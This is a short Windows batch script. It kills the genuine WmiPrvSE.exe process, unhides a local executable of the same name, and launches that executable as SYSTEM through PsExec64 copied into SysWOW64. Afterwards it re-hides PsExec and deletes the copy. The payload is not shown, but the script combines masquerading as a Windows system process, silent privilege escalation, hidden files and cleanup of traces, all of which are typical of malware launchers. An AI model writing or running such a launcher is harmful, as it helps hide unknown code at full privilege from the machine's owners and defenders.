@echo off
taskkill /f /t /im WmiPrvSE.exe

attrib -R -S -H %cd%\PsExec64.exe

attrib -R -S -H %cd%\WmiPrvSE.exe



copy PsExec64.exe C:\Windows\SysWOW64\PsExec64.exe

start C:\Windows\SysWOW64\PsExec64.exe -i -d -s %cd%\WmiPrvSE.exe

attrib +R +S +H %cd%\PsExec64.exe



ping 127.0.0.1 -n 2 >nul

DEL C:\Windows\SysWOW64\PsExec64.exe

pause